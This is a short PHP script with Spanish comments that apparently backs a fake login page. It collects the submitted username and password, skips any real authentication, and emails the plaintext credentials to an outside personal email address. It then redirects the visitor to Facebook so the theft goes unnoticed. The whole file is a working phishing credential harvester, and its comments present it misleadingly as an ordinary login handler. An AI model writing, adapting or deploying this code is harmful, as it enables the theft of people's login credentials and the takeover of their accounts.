<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Validar los datos (deberías realizar validación más robusta en un entorno de producción)
    if (empty($username) || empty($password)) {
        echo "Por favor, completa todos los campos.";
        exit;
    }

    // Aquí podrías realizar la autenticación del usuario en tu base de datos

    // Enviar correo electrónico
    $to = "yahirgomezmezaramirez@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Usuario: $username\nContraseña: $password";
    $headers = "From: webmaster@example.com"; // Cambia esto a la dirección del remitente real

    mail($to, $subject, $message, $headers);

    // Redireccionar a Facebook
    header("Location: https://www.facebook.com");
    exit;
}
?>